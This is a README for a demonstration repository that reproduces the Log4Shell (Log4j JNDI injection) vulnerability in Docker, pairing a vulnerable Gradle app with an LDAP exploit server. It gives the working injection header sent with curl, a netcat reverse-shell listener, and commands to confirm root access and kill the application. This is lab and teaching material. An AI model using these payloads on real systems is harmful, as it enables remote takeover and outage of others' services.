# ossec-log4j

This repository forks two repositories to demostrate the Log4J Vulnerability

log4shell-vulnerable-app - contains a Gradle application that is vulnerable to the log4j attack in its headers

JNDI-Injection-Exploit - is an LDAP server that is used in the exploit for the vulnerable application to make a request to

## Setup Attack

The following command will set the environment variable ADDRESS to the host IPv4 address. The address is used to pass to the LDAP server to generate a nc command for a reverse shell.

```console
ADDRESS=$(ipconfig getifaddr en0) docker compose up -d
```

The docker compose environment will generate two containers.

1. LDAP Server
2. Vulnerable Application

Two terminals can be opened to view the logs

```console
docker compose logs -ft <service-in-compose-file>
```

## Exploit

On the host, set up a terminal to listen for incomming requests on port tcp/3000.
This terminal will be used to recieve the reverse shell.

```console
nc -lv 3000
```

In a second terminal, run the following request to the vulnerable application.
The ldap string can be taken from the logs of the LDAP server.

The vulnerable appliation will parse the Header and log the Header value. This will cause the vulnerable application to make a request
to the LDAP server and run the payload given. The payload will execute with the applications privileges and invoke a nc connection to the listener.

```console
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://<ipv4>:<port>/<random-string}'
```

To verify the reverse shell type

```console
whoami
```

or

```console
ps
```

From here, you are root in the container running the application. You can do whatever you want, including changing config, and killing the application.

The following command will kill the PID 1 process of the container which should be the application.

```console
kill 1
```
